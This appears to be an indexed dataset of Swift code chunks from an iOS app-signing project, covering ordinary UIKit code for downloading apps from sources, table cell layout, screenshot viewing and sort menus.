3246,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","Function handleDownloadAction - implements handledownloadaction functionality","private func handleDownloadAction(for appUUID: String, at indexPath: IndexPath, downloadURL: URL) {
if let task = DownloadTaskManager.shared.task(for: appUUID) {"
3247,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","MARK: - Long Press Actions","@objc func getButtonHold(_ gesture: UILongPressGestureRecognizer) {
guard gesture.state == .began,
let button = gesture.view as? UIButton else { return }"
3248,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","Function addVersionActions - implements addversionactions functionality","private func addVersionActions(
to alertController: UIAlertController,
for app: StoreAppsData,
at indexPath: IndexPath
) {"
3249,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","Function presentAlertController - implements presentalertcontroller functionality","private func presentAlertController(_ alertController: UIAlertController) {
DispatchQueue.main.async {"
3250,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","extension SourceAppViewController - Controls user interface and application flow","extension SourceAppViewController: DownloadDelegate {
func stopDownload(uuid: String) {"
3251,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function stopDownload - implements stopdownload functionality","func stopDownload(uuid: String) {
DispatchQueue.main.async {"
3252,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function startDownload - implements startdownload functionality","func startDownload(uuid: String, indexPath _: IndexPath) {
DispatchQueue.main.async {"
3253,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function updateDownloadProgress - updates downloadprogress","func updateDownloadProgress(progress: Double, uuid: String) {
DownloadTaskManager.shared.updateTask(uuid: uuid, state: .inProgress(progress: progress))
}
}

extension SourceAppViewController {"
3254,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","extension SourceAppViewController - Controls user interface and application flow","extension SourceAppViewController {
func startDownloadIfNeeded(
for indexPath: IndexPath,
in tableView: UITableView,
downloadURL: URL?,
appUUID: String?,
sourceLocation: String
) {"
3255,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function startDownloadIfNeeded - implements startdownloadifneeded functionality","func startDownloadIfNeeded(
for indexPath: IndexPath,
in tableView: UITableView,
downloadURL: URL?,
appUUID: String?,
sourceLocation: String
) {"
3256,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","MARK: - Private Download Helper Methods","private func setupCellForDownload(_ cell: AppTableViewCell) {
if cell.appDownload == nil {"
3257,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function showDownloadAnimation - implements showdownloadanimation functionality","private func showDownloadAnimation(in cell: AppTableViewCell) -> UIView {
// Show download animation in cell
let animationView = cell.addAnimatedIcon(
systemName: ""arrow.down.circle"",
tintColor: .systemBlue,
size: CGSize(width: 40, height: 40)
)

// Position animation in the cell
animationView.translatesAutoresizingMaskIntoConstraints = false"
3258,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function downloadFile - implements downloadfile functionality","private func downloadFile(downloadURL: URL, appUUID: String, indexPath: IndexPath) async throws -> URL {
// Create a temporary file path for the download
let tempDir = FileManager.default.temporaryDirectory
let filePath = tempDir.appendingPathComponent(""app_\(appUUID).ipa"")

// Start download and show progress
startDownload(uuid: appUUID, indexPath: indexPath)

// Download file with URLSession
let request = URLRequest(url: downloadURL)"
3259,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function verifyDownloadedFile - implements verifydownloadedfile functionality","private func verifyDownloadedFile(at url: URL) throws {
let fileData = try Data(contentsOf: url)
let checksum = CryptoHelper.shared.crc32(of: fileData)
Debug.shared.log(message: ""Download completed with checksum: \(checksum)"", type: .info)
}

private func processDownloadedBundle(
cell: AppTableViewCell,
animationView: UIView,
downloadedURL: URL,"
3260,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function processDownloadedBundle - implements processdownloadedbundle functionality","private func processDownloadedBundle(
cell: AppTableViewCell,
animationView: UIView,
downloadedURL: URL,
appUUID: String,
sourceLocation: String
) async {"
3261,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function handleExtractionError - implements handleextractionerror functionality","private func handleExtractionError(_ error: Error, cell: AppTableViewCell, appUUID: String) {
DownloadTaskManager.shared.updateTask(uuid: appUUID, state: .failed(error: error))
Debug.shared.log(message: ""Extraction error: \(error.localizedDescription)"", type: .error)

showStatusAnimation(
in: cell,
systemName: ""exclamationmark.circle"",
tintColor: .systemRed
)
}"
3262,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function processExtractedBundle - implements processextractedbundle functionality","private func processExtractedBundle(
targetBundle: String,
cell: AppTableViewCell,
appUUID: String,
sourceLocation: String
) {"
3263,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function handleImmediateInstallIfNeeded - implements handleimmediateinstallifneeded functionality","private func handleImmediateInstallIfNeeded(appUUID: String) {
// Check if immediate install is enabled
if UserDefaults.standard.signingOptions.immediatelyInstallFromSource {"
3264,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function handleDownloadError - implements handledownloaderror functionality","private func handleDownloadError(
_ error: Error,
cell: AppTableViewCell,
animationView: UIView,
appUUID: String,
downloadURL: URL
) async {"
3265,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function logDownloadError - implements logdownloaderror functionality","private func logDownloadError(_ error: Error, downloadURL: URL) {
// Handle error logging based on error type
// Note: Removed unnecessary cast since all Error objects can be treated as NSError
let nsError = error as NSError
Debug.shared.log(
message: ""Download error: \(nsError.localizedDescription) (code: \(nsError.code))"",
type: .error
)

// Add detailed error diagnostics"
3266,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","Function showStatusAnimation - implements showstatusanimation functionality","private func showStatusAnimation(
in cell: AppTableViewCell,
systemName: String,
tintColor: UIColor
) {"
3267,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppDownload.swift","protocol DownloadDelegate - implements functionality related to download delegate","protocol DownloadDelegate: AnyObject {
func updateDownloadProgress(progress: Double, uuid: String)
func stopDownload(uuid: String)
}

// This extension is moved to UIApplication+TopViewController.swift to avoid redeclaration
"
3268,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - AppTableViewCell","class AppTableViewCell: UITableViewCell {
// MARK: - Properties

var appDownload: AppDownload?
private var progressObserver: NSObjectProtocol?

private let progressLayer = CAShapeLayer()
private var getButtonWidthConstraint: NSLayoutConstraint?
private var buttonImage: UIImage?
"
3269,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - View Setup","private func setupViews() {
let labelsStackView = UIStackView(arrangedSubviews: [nameLabel, versionLabel])
labelsStackView.axis = .vertical
labelsStackView.spacing = 1

// Add subviews
contentView.addSubview(iconImageView)
contentView.addSubview(labelsStackView)
contentView.addSubview(screenshotsScrollView)
screenshotsScrollView.addSubview(screenshotsStackView)"
3270,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints(labelsStackView: UIStackView) {
NSLayoutConstraint.activate([
iconImageView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 15),
iconImageView.widthAnchor.constraint(equalToConstant: 52),
iconImageView.heightAnchor.constraint(equalToConstant: 52),

labelsStackView.leadingAnchor.constraint(equalTo: iconImageView.trailingAnchor, constant: 15),
labelsStackView.trailingAnchor.constraint(equalTo: getButton.leadingAnchor, constant: -15),
labelsStackView.centerYAnchor.constraint(equalTo: iconImageView.centerYAnchor),
labelsStackView.topAnchor.constraint(greaterThanOrEqualTo: contentView.topAnchor, constant: 15),"
3271,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Button Configuration","private func configureGetButtonArrow() {
let symbolConfig = UIImage.SymbolConfiguration(pointSize: 13, weight: .bold)
buttonImage = UIImage(systemName: ""arrow.down"", withConfiguration: symbolConfig)
getButton.setImage(buttonImage, for: .normal)
getButton.tintColor = .tintColor
}

private func configureGetButtonSquare() {"
3272,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function configureGetButtonSquare - implements configuregetbuttonsquare functionality","private func configureGetButtonSquare() {
let symbolConfig = UIImage.SymbolConfiguration(pointSize: 9, weight: .bold)
buttonImage = UIImage(systemName: ""square.fill"", withConfiguration: symbolConfig)
getButton.setImage(buttonImage, for: .normal)
getButton.tintColor = .tintColor
}

private func configureProgressLayer() {"
3273,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function configureProgressLayer - implements configureprogresslayer functionality","private func configureProgressLayer() {
progressLayer.strokeColor = UIColor.tintColor.cgColor
progressLayer.lineWidth = 3.0
progressLayer.fillColor = nil
progressLayer.lineCap = .round
progressLayer.strokeEnd = 0.0

let circularPath = UIBezierPath(roundedRect: getButton.bounds, cornerRadius: 15)
progressLayer.path = circularPath.cgPath
getButton.layer.addSublayer(progressLayer)"
3274,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function addObservers - implements addobservers functionality","private func addObservers() {
progressObserver = NotificationCenter.default.addObserver(
forName: .downloadProgressUpdated,
object: nil,
queue: .main
) { [weak self] notification in"
3275,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Lifecycle Methods","override func layoutSubviews() {
super.layoutSubviews()
updateProgressLayerPath()
}

override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {"
3276,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function traitCollectionDidChange - implements traitcollectiondidchange functionality","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)
getButton.layer.backgroundColor = UIColor.quaternarySystemFill.cgColor
updateProgressLayerPath()
}

// MARK: - Cell Configuration

func configure(with app: StoreAppsData) {"
3277,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Cell Configuration","func configure(with app: StoreAppsData) {
// Configure basic app info
configureAppName(app)
configureVersionText(app)
configureAppIcon(app)

// Remove any existing screenshots
screenshotsStackView.arrangedSubviews.forEach { $0.removeFromSuperview() }"
3278,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function configureAppName - implements configureappname functionality","private func configureAppName(_ app: StoreAppsData) {
var appname = app.name
if app.bundleIdentifier.hasSuffix(""Beta"") {"
3279,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function configureVersionText - implements configureversiontext functionality","private func configureVersionText(_ app: StoreAppsData) {
let appVersion = (app.versions?.first?.version ?? app.version) ?? ""1.0""
var displayText = appVersion
var descText = """"

// Add date if available
displayText = addDateToDisplayText(displayText, app: app)

// Add subtitle/description based on preferences
(displayText, descText) = addAppDescriptionInfo(displayText, app: app)"
3280,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function addDateToDisplayText - implements adddatetodisplaytext functionality","private func addDateToDisplayText(_ displayText: String, app: StoreAppsData) -> String {
var result = displayText
let appDate = (app.versions?.first?.date ?? app.versionDate) ?? """"

if !appDate.isEmpty {"
3281,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function addAppDescriptionInfo - implements addappdescriptioninfo functionality","private func addAppDescriptionInfo(_ displayText: String, app: StoreAppsData) -> (String, String) {
var resultDisplay = displayText
var descText = """"

switch Preferences.appDescriptionAppearence {"
3282,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function configureAppIcon - implements configureappicon functionality","private func configureAppIcon(_ app: StoreAppsData) {
iconImageView.image = UIImage(named: ""unknown"")

if let iconURL = app.iconURL {"
3283,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function setupAppContentLayout - sets upappcontentlayout","private func setupAppContentLayout(_ app: StoreAppsData) {
if let screenshotUrls = app.screenshotURLs,
!screenshotUrls.isEmpty,
Preferences.appDescriptionAppearence != 2
{"
3284,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Screenshots Setup","private func setupScreenshots(for urls: [URL]) {
let imageViews = createImageViewsForScreenshots(urls)

screenshotsScrollView.topAnchor.constraint(equalTo: iconImageView.bottomAnchor, constant: 10).isActive = true
screenshotsScrollView.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -15).isActive = true
iconImageView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 15).isActive = true

for imageView in imageViews {"
3285,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createImageViewsForScreenshots - creates imageviewsforscreenshots","private func createImageViewsForScreenshots(_ urls: [URL]) -> [UIImageView] {
return urls.map { _ -> UIImageView in"
3286,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function setupDescription - sets updescription","private func setupDescription() {
iconImageView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 15).isActive = true
descriptionLabel.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -15).isActive = true
descriptionLabel.topAnchor.constraint(equalTo: iconImageView.bottomAnchor, constant: 15).isActive = true
}

@objc private func handleScreenshotTap(_ sender: UITapGestureRecognizer) {"
3287,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function handleScreenshotTap - implements handlescreenshottap functionality","@objc private func handleScreenshotTap(_ sender: UITapGestureRecognizer) {
guard let tappedImageView = sender.view as? UIImageView,
let tappedImage = tappedImageView.image
else {"
3288,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Image Loading","private func loadImages(from urls: [URL], into imageViews: [UIImageView]) {
let dispatchGroup = DispatchGroup()

for (index, url) in urls.enumerated() {"
3289,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function loadImage - implements loadimage functionality","private func loadImage(from url: URL, completion: @escaping (UIImage?) -> Void) {
let request = ImageRequest(url: url)

if let cachedImage = ImagePipeline.shared.cache.cachedImage(for: request)?.image {"
3290,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Download State","private func updateDownloadState(uuid: String?) {
guard let appUUID = uuid else { return }"
3291,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function updateProgress - updates progress","func updateProgress(to value: CGFloat) {
DispatchQueue.main.async {"
3292,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function startDownload - implements startdownload functionality","func startDownload() {
DispatchQueue.main.async {"
3293,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function stopDownload - implements stopdownload functionality","func stopDownload() {
DispatchQueue.main.async {"
3294,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function cancelDownload - implements canceldownload functionality","func cancelDownload() {
DispatchQueue.main.async {"
3295,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function updateProgressLayerPath - updates progresslayerpath","private func updateProgressLayerPath() {
let circularPath = UIBezierPath(roundedRect: getButton.bounds, cornerRadius: 15)
progressLayer.path = circularPath.cgPath
}
}

// MARK: - Factory for UI Elements

private enum AppCellFactory {"
3296,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Factory for UI Elements","private enum AppCellFactory {
static func createIconImageView() -> UIImageView {"
3297,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createIconImageView - creates iconimageview","static func createIconImageView() -> UIImageView {
let imageView = UIImageView()
imageView.contentMode = .scaleAspectFill
imageView.clipsToBounds = true
imageView.layer.cornerRadius = 12
imageView.layer.cornerCurve = .continuous
imageView.layer.borderWidth = 1
imageView.layer.borderColor = UIColor.lightGray.withAlphaComponent(0.3).cgColor
imageView.translatesAutoresizingMaskIntoConstraints = false
return imageView"
3298,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createNameLabel - creates namelabel","static func createNameLabel() -> UILabel {
let label = UILabel()
label.font = .boldSystemFont(ofSize: 16)
label.numberOfLines = 1
label.translatesAutoresizingMaskIntoConstraints = false
return label
}

static func createVersionLabel() -> UILabel {"
3299,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createVersionLabel - creates versionlabel","static func createVersionLabel() -> UILabel {
let label = UILabel()
label.font = .systemFont(ofSize: 13, weight: .regular)
label.textColor = .gray
label.numberOfLines = 2
label.translatesAutoresizingMaskIntoConstraints = false
return label
}

static func createDescriptionLabel() -> UILabel {"
3300,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createDescriptionLabel - creates descriptionlabel","static func createDescriptionLabel() -> UILabel {
let label = UILabel()
label.font = .systemFont(ofSize: 13, weight: .regular)
label.textColor = .gray
label.numberOfLines = 20
label.translatesAutoresizingMaskIntoConstraints = false
return label
}

static func createScreenshotsScrollView() -> UIScrollView {"
3301,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createScreenshotsScrollView - creates screenshotsscrollview","static func createScreenshotsScrollView() -> UIScrollView {
let scrollView = UIScrollView()
scrollView.contentInset = UIEdgeInsets(top: 0, left: 15, bottom: 0, right: 15)
scrollView.showsHorizontalScrollIndicator = false
scrollView.translatesAutoresizingMaskIntoConstraints = false
return scrollView
}

static func createScreenshotsStackView() -> UIStackView {"
3302,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function createScreenshotsStackView - creates screenshotsstackview","static func createScreenshotsStackView() -> UIStackView {
let stackView = UIStackView()
stackView.axis = .horizontal
stackView.spacing = 10
stackView.alignment = .center
stackView.translatesAutoresizingMaskIntoConstraints = false
return stackView
}
}
"
3303,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - SourceAppScreenshotViewController","class SourceAppScreenshotViewController: UIViewController {
// MARK: - Properties

var image: UIImage?

// MARK: - UI Components

private let imageView: UIImageView = {"
3304,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupView()
}

override func viewDidLayoutSubviews() {"
3305,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function viewDidLayoutSubviews - implements viewdidlayoutsubviews functionality","override func viewDidLayoutSubviews() {
super.viewDidLayoutSubviews()
updateImageViewSize()
}

// MARK: - Setup

private func setupView() {"
3306,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Setup","private func setupView() {
view.backgroundColor = .systemBackground
view.addSubview(imageView)
setupConstraints()
imageView.image = image

navigationItem.rightBarButtonItem = UIBarButtonItem(
title: String.localized(""DONE""),
style: .done,
target: self,"
3307,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
NSLayoutConstraint.activate([
imageView.centerXAnchor.constraint(equalTo: view.safeAreaLayoutGuide.centerXAnchor),
imageView.centerYAnchor.constraint(equalTo: view.safeAreaLayoutGuide.centerYAnchor),
imageView.widthAnchor.constraint(lessThanOrEqualTo: view.safeAreaLayoutGuide.widthAnchor, multiplier: 0.9),
imageView.heightAnchor.constraint(
lessThanOrEqualTo: view.safeAreaLayoutGuide.heightAnchor,
multiplier: 0.9
),
])"
3308,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","Function updateImageViewSize - updates imageviewsize","private func updateImageViewSize() {
guard let image = image else { return }"
3309,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppTableViewCell.swift","MARK: - Actions","@objc func closeSheet() {
dismiss(animated: true)
}
}
"
3310,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - SortOption","enum SortOption: String, Codable {
case `default`
case name
case date
}

// MARK: - SourceAppViewController

class SourceAppViewController: UITableViewController {"
3311,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - SourceAppViewController","class SourceAppViewController: UITableViewController {
// MARK: - Properties

var newsData: [NewsData] = []
var apps: [StoreAppsData] = []
var oApps: [StoreAppsData] = []
var filteredApps: [StoreAppsData] = []

var name: String? { didSet { title = name } }"
3312,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupNavigation()
setupSearchController()
setupViews()
loadAppsData()
}

// MARK: - Setup Methods
"
3313,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Setup Methods","fileprivate func setupViews() {
tableView.dataSource = self
tableView.delegate = self
tableView.tableHeaderView = UIView()
tableView.register(AppTableViewCell.self, forCellReuseIdentifier: ""AppTableViewCell"")
navigationItem.titleView = activityIndicator
activityIndicator.startAnimating()
}

private func setupHeader() {"
3314,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function setupHeader - sets upheader","private func setupHeader() {
guard uri.count == 1, !newsData.isEmpty else { return }"
3315,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
navigationItem.largeTitleDisplayMode = .never
}

// MARK: - Filter Menu

private func updateFilterMenu() {"
3316,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Filter Menu","private func updateFilterMenu() {
let filterMenu = UIMenu(
title: String.localized(""SOURCES_CELLS_ACTIONS_FILTER_TITLE""),
children: createSubSortMenu()
)
let filterButton = UIBarButtonItem(
image: UIImage(systemName: ""line.3.horizontal.decrease""),
menu: filterMenu
)
"
3317,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function createSubSortMenu - creates subsortmenu","private func createSubSortMenu() -> [UIMenuElement] {
let sortByDAction = createSortAction(
title: String.localized(""SOURCES_CELLS_ACTIONS_FILTER_BY_DEFAULT""),
sortOption: .default
)
let sortByNameAction = createSortAction(
title: String.localized(""SOURCES_CELLS_ACTIONS_FILTER_BY_NAME""),
sortOption: .name
)
let sortBySizeAction = createSortAction("
3318,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function createSortAction - creates sortaction","private func createSortAction(title: String, sortOption: SortOption) -> UIAction {
return UIAction(
title: title,
image: arrowImage(for: sortOption),
identifier: UIAction.Identifier(""sort\(title)""),
state: Preferences.currentSortOption == sortOption ? .on : .off,
handler: { [weak self] _ in"
3319,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function handleSortOptionSelected - implements handlesortoptionselected functionality","private func handleSortOptionSelected(_ sortOption: SortOption) {
if Preferences.currentSortOption == sortOption {"
3320,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","/ Arrow images for Sort options","func arrowImage(for sortOption: SortOption) -> UIImage? {
let isAscending = Preferences.currentSortOptionAscending
let imageName = isAscending ? ""chevron.up"" : ""chevron.down""
return sortOption == Preferences.currentSortOption ? UIImage(systemName: imageName) : nil
}

func updateSortOrderImage(for sortOption: SortOption) {"
3321,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function updateSortOrderImage - updates sortorderimage","func updateSortOrderImage(for sortOption: SortOption) {
guard let sortActionsGroup = sortActionsGroup else {"
3322,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Filtering & Sorting","func applyFilter() {
let sortOption = Preferences.currentSortOption
let ascending = Preferences.currentSortOptionAscending

switch sortOption {"
3323,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function sortAppsByDate - implements sortappsbydate functionality","private func sortAppsByDate(ascending: Bool) -> [StoreAppsData] {
return apps.sorted { app1, app2 in"
3324,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function reloadTableWithAnimation - implements reloadtablewithanimation functionality","private func reloadTableWithAnimation() {
UIView.transition(
with: tableView,
duration: 0.3,
options: .transitionCrossDissolve,
animations: { self.tableView.reloadData() }"
3325,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - App Filtering","private func shouldFilter() -> StoreAppsData? {
guard let name = highlightAppName,
let id = highlightBundleID,
let version = highlightVersion,
let desc = highlightDescription
else {"
3326,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function filterApps - implements filterapps functionality","private func filterApps(
from apps: [StoreAppsData],
name: String,
id: String,
version: String,
desc: String,
devname: String?
) -> [StoreAppsData] {"
3327,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","MARK: - Data Loading","private func loadAppsData() {
guard let urls = uri else { return }"
3328,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppViewController.swift","Function fetchDataFromURL - implements fetchdatafromurl functionality","private func fetchDataFromURL(
_ uri: URL,
completion: @escaping ([StoreAppsData], [NewsData], String, String) -> Void
) {"
